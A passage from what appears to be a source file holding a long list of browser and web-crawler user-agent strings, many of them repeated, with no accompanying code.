               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
